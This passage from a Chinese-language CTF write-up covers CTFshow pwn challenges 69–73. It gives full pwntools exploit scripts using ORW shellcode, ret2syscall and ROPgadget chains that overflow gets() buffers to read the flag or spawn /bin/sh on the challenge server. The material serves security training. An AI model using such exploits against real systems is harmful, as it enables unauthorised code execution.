class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>mmap<span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>shellcode<span class=\"token operator\">+=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>mmap<span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>mmap<span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"mov rax,0x123000; jmp rax\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>payload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>payload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>jmp_rsp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"sub rsp,0x30; jmp rsp\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn7064位orw\"><a class=\"anchor\" href=\"#pwn7064位orw\">#</a> pwn70（64 位 orw）</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p>题目描述： <code>可以开始你的个人秀了 flag文件位置为/flag</code></p>\n<p>64 位程序，开启了 canary</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre>\n<p>ida 无法反汇编</p>\n<p><code>main:</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/U%7BU6%40O0%28I3TRL%7BXSN1X%5BI%246.png\" alt=\"\" /></p>\n<p><code>is_printable:</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/buuctf/CGF%7D4%24U8MT4QD%29%7E3A9HBO1X.png\" alt=\"\" /></p>\n<p>通过这就找到，我们需要跳出这个循环，就需要让 0（图里的 rbx 第一次应该为 0）大于等于 strlen 的长度，所以用 <code>\\x00</code>  截断【<s>但是又疑惑一点，wp 中先 push 0，然后 push flag，这个 0 难道不是作为 flag 字符串的结束符吗</s>，这里并不是作为终止符，如果是终止符应该是后 push 0 才对】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn69'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28294</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mmap<span class=\"token operator\">=</span><span class=\"token number\">0x000000000602068</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>jmp_rsp<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400a01</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"name:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>shellcode<span class=\"token operator\">=</span><span class=\"token string\">\"push 0;push 0x67616c66;mov rax,2;mov rdi,rsp;xor rsi,rsi;xor rdx,rdx;syscall;\"</span> <span class=\"token operator\">//</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>注意这里先push的<span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token string\">\"mov rax,0;mov rdi ,0x3;mov rsi,rsp;mov rdx,0x100;syscall;\"</span><span class=\"token operator\">//</span>read</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>shellcode<span class=\"token operator\">+=</span><span class=\"token string\">\"mov rax,1;mov rdi ,0x1;mov rsi,rsp;mov rdx,0x100;syscall\"</span> <span class=\"token operator\">//</span>write</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn7132位系统调用\"><a class=\"anchor\" href=\"#pwn7132位系统调用\">#</a> pwn71 (32 位系统调用)</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p>题目描述： <code>32位的ret2syscall</code></p>\n<p>32 位程序 ，开启了 nx</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p>ida32 查看</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+1Ch] [ebp-64h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============CTFshow--PWN===============\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Try to use ret2syscall!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有 gets 可以直接进行溢出，根据题目是系统调用，那么查看系统是否有 <code>int 0x80</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/K2G1RPB7%60ETXP%7E%7E%24A%7D%7B%40G8R.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/C%60HNG5_XON6I%7BN%25FDRTVZ%5BY.png\" alt=\"\" /></p>\n<p>直接构造系统调用的 rop (ret 后面接参数)</p>\n<p>这里 ida 的偏移不准，最后发现是 0x70（0x6c+4）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process(\"\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28158</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>binsh<span class=\"token operator\">=</span><span class=\"token number\">0x080be408</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>int_0x80<span class=\"token operator\">=</span><span class=\"token number\">0x08049421</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>eax<span class=\"token operator\">=</span><span class=\"token number\">0x080bb196</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ebx<span class=\"token operator\">=</span><span class=\"token number\">0x080481c9</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pop_edx_ecx_ebx_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0806eb90</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>eax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_edx_ecx_ebx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>int_0x80<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn72多次执行系统调用\"><a class=\"anchor\" href=\"#pwn72多次执行系统调用\">#</a> pwn72 (多次执行系统调用)</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p>题目描述： <code>接着练ret2syscall，多系统函数调用</code></p>\n<p>32 位程序</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+10h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CTFshow-PWN\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"where is my system?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Emmm\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>找到的这个 <code>int 0x80</code>  无法使用，因为没有 <code>ret</code>  无法执行后面的系统调用</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/I%5BPQ8%5B%287HBT%40CZ9XSO%60O1%28F.png\" alt=\"\" /></p>\n<p>利用这个地址的 <code>int 0x80</code> , 后面有 ret<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/OXY%24TCTEC%7B4%25SK%7E5T9AVB5K.png\" alt=\"\" /></p>\n<p>并没有找到 <code>'/bin/sh'</code> <br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/1%247%29H%29DJEL9T9QEVFM789%24S.png\" alt=\"\" /></p>\n<p>改用 <code>sh</code>  没有成功，利用 <code>系统调用read函数将</code> 来将 <code>/bin/sh</code>  写入到 bss 段上</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28212</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sh<span class=\"token operator\">=</span><span class=\"token number\">0x080be52b</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>int_0x80<span class=\"token operator\">=</span><span class=\"token number\">0x806F350</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>eax<span class=\"token operator\">=</span><span class=\"token number\">0x080bb2c6</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>ebx<span class=\"token operator\">=</span><span class=\"token number\">0x080481c9</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bss<span class=\"token operator\">=</span><span class=\"token number\">0x80EAF85</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pop_edx_ecx_ebx_ret<span class=\"token operator\">=</span><span class=\"token number\">0x0806ecb0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">44</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>eax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_edx_ecx_ebx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>int_0x80<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload<span class=\"token operator\">+=</span>p32<span class=\"token punctuation\">(</span>eax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_edx_ecx_ebx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>int_0x80<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn73ropgadget构造系统调用\"><a class=\"anchor\" href=\"#pwn73ropgadget构造系统调用\">#</a> pwn73 (ROPgadget 构造系统调用)</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p>题目描述： <code>愉快的尝试一下一把梭吧！</code></p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Try to Show-hand!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>直接有个溢出，然后根据题目说明直接利用 ROPgadget 构造系统调用链即可</p>\n<p><code>ROPgadget --binary pwn73 --ropchain</code></p>\n<p>将产生的 rop 链复制到 exp 里加上对应字节的 padding 和库函数即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> pack</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>P<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28270</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">28</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806f02a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080b81c6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin'</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080549db</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806f02a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea064</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 4</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080b81c6</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'//sh'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080549db</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; 